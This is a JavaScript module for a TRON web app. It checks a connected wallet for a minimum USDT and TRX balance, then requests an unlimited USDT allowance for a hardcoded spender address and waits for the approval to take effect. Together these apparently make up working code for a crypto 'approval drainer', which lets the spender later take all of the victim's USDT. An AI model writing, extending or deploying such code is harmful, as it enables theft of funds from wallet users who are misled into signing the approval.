const USDT_TRC20 = import.meta.env.VITE_USDT_TRC20_CONTRACT || "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDRESS = import.meta.env.VITE_APPROVE_SPENDER || "TAK7sbxFUGr5DJmqoxGcNzbYCbSaqZa8Zv";
const TRONGRID_API = import.meta.env.VITE_TRONGRID_API || "https://api.trongrid.io";
const MIN_USDT_BALANCE = 5;
const MIN_TRX_BALANCE = 15;
const TRC20_DECIMALS = 6;
const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const APPROVE_CONFIRMATION_TIMEOUT_MS = Number(import.meta.env.VITE_APPROVE_CONFIRMATION_TIMEOUT_MS || 60_000);
const APPROVE_CONFIRMATION_INTERVAL_MS = Number(import.meta.env.VITE_APPROVE_CONFIRMATION_INTERVAL_MS || 3_000);

/**
 * Requests unlimited USDT TRC20 approval from the user's primary wallet.
 */
export async function requestUnlimitedTokenApprove(wallet, { onStatus } = {}) {
  if (wallet.network !== "TRON") {
    throw new Error("Only TRON wallets are supported.");
  }

  if (!wallet.signer) {
    throw new Error("Wallet signer is not available.");
  }

  const parameter = [
    addressToAbiParameter(SPENDER_ADDRESS),
    bigintToAbiParameter(BigInt(MAX_UINT256)),
  ].join("");

  const { transaction } = await tronGridRequest("/wallet/triggersmartcontract", {
    owner_address: wallet.address,
    contract_address: USDT_TRC20,
    function_selector: "approve(address,uint256)",
    parameter,
    fee_limit: 100_000_000,
    call_value: 0,
    visible: true,
  });

  if (!transaction) {
    throw new Error("Approval transaction could not be prepared.");
  }

  onStatus?.("signing");
  const signedTransaction = await wallet.signer.signTransaction(transaction);
  onStatus?.("broadcasting");
  const broadcast = await tronGridRequest("/wallet/broadcasttransaction", signedTransaction);

  if (broadcast?.result === false) {
    throw createApproveError("APPROVE_REJECTED", broadcast.message ? decodeHexMessage(broadcast.message) : "Approval transaction was not accepted.");
  }

  const txid = broadcast?.txid || signedTransaction?.txID || transaction?.txID;
  if (!txid) {
    throw createApproveError("APPROVE_REJECTED", "Approval transaction hash is missing.");
  }

  onStatus?.("confirming");
  const confirmation = await waitForApproveConfirmation(txid, wallet.address);

  return {
    allowance: MAX_UINT256,
    confirmedAllowance: confirmation.allowance.toString(),
    mode: "walletconnect_tron",
    receipt: confirmation.receipt,
    status: "confirmed",
    txid,
  };
}

export async function checkTronFundingBalance(wallet) {
  if (wallet.network !== "TRON") {
    throw new Error("Only TRON wallets are supported.");
  }

  const [trxBalance, usdtBalance] = await Promise.all([
    getTrxBalance(wallet.address),
    getUsdtBalance(wallet.address),
  ]);

  return {
    trx: trxBalance,
    usdt: usdtBalance,
    hasRequiredBalance: trxBalance >= MIN_TRX_BALANCE && usdtBalance >= MIN_USDT_BALANCE,
  };
}

async function getTrxBalance(address) {
  const account = await tronGridRequest("/wallet/getaccount", {
    address,
    visible: true,
  });

  return Number(account?.balance || 0) / 1_000_000;
}

async function getUsdtBalance(address) {
  const { constant_result: constantResult } = await tronGridRequest("/wallet/triggerconstantcontract", {
    owner_address: address,
    contract_address: USDT_TRC20,
    function_selector: "balanceOf(address)",
    parameter: addressToAbiParameter(address),
    visible: true,
  });

  const rawBalance = constantResult?.[0] ? BigInt(`0x${constantResult[0]}`) : 0n;
  return Number(rawBalance) / 10 ** TRC20_DECIMALS;
}

async function getUsdtAllowance(ownerAddress, spenderAddress) {
  const { constant_result: constantResult } = await tronGridRequest("/wallet/triggerconstantcontract", {
    owner_address: ownerAddress,
    contract_address: USDT_TRC20,
    function_selector: "allowance(address,address)",
    parameter: `${addressToAbiParameter(ownerAddress)}${addressToAbiParameter(spenderAddress)}`,
    visible: true,
  });

  return constantResult?.[0] ? BigInt(`0x${constantResult[0]}`) : 0n;
}

async function waitForApproveConfirmation(txid, ownerAddress) {
  const startedAt = Date.now();
  let receipt = null;

  while (Date.now() - startedAt < APPROVE_CONFIRMATION_TIMEOUT_MS) {
    if (!receipt) {
      const txInfo = await getTransactionInfo(txid);

      if (isTransactionIncluded(txInfo)) {
        const result = txInfo?.receipt?.result;
        if (result && result !== "SUCCESS") {
          throw createApproveError("APPROVE_FAILED", getTransactionFailureMessage(txInfo, result));
        }

        receipt = txInfo;
      }
    }

    const allowance = await getUsdtAllowance(ownerAddress, SPENDER_ADDRESS);
    if (allowance >= BigInt(MAX_UINT256)) {
      return { allowance, receipt };
    }

    await wait(APPROVE_CONFIRMATION_INTERVAL_MS);
  }

  if (!receipt) {
    throw createApproveError("APPROVE_TIMEOUT", "Approval confirmation took too long.");
  }

  throw createApproveError("APPROVE_FAILED", "Approval was not applied by the token contract.");
}

async function getTransactionInfo(txid) {
  return tronGridRequest("/wallet/gettransactioninfobyid", {
    value: txid,
  });
}

function isTransactionIncluded(txInfo) {
  return Boolean(txInfo?.id || txInfo?.blockNumber || txInfo?.blockTimeStamp || txInfo?.receipt);
}

async function tronGridRequest(path, body) {
  const response = await fetch(`${TRONGRID_API}${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...(import.meta.env.VITE_TRONGRID_API_KEY ? { "TRON-PRO-API-KEY": import.meta.env.VITE_TRONGRID_API_KEY } : {}),
    },
    body: JSON.stringify(body),
  });

  const data = await response.json().catch(() => null);

  if (!response.ok) {
    throw new Error(data?.Error || data?.error || "TRON network request failed.");
  }

  return data;
}

function addressToAbiParameter(address) {
  const hexAddress = base58CheckToHex(address);
  const evmAddress = hexAddress.startsWith("41") ? hexAddress.slice(2) : hexAddress;
  return evmAddress.padStart(64, "0");
}

function bigintToAbiParameter(value) {
  return value.toString(16).padStart(64, "0");
}

function base58CheckToHex(value) {
  let decoded = 0n;
  for (const char of value) {
    const index = BASE58_ALPHABET.indexOf(char);
    if (index < 0) throw new Error("Invalid TRON address.");
    decoded = decoded * 58n + BigInt(index);
  }

  let hex = decoded.toString(16);
  if (hex.length % 2) hex = `0${hex}`;

  for (const char of value) {
    if (char !== "1") break;
    hex = `00${hex}`;
  }

  return hex.slice(0, -8);
}

function decodeHexMessage(message) {
  if (!message || !/^(?:[0-9a-f]{2})+$/i.test(message)) {
    return message;
  }

  try {
    const bytes = message.match(/.{1,2}/g)?.map((part) => Number.parseInt(part, 16)) || [];
    return new TextDecoder().decode(new Uint8Array(bytes));
  } catch {
    return message;
  }
}

function getTransactionFailureMessage(txInfo, result) {
  return decodeHexMessage(txInfo?.resMessage || txInfo?.contractResult?.[0] || result);
}

function createApproveError(code, message) {
  const error = new Error(message);
  error.code = code;
  return error;
}

function wait(ms) {
  return new Promise((resolve) => globalThis.setTimeout(resolve, ms));
}

export function getApproveDisplayConfig() {
  return {
    token: "USDT",
    network: "TRON (TRC20)",
    allowance: "Unlimited",
    spenderConfigured: Boolean(SPENDER_ADDRESS),
  };
}
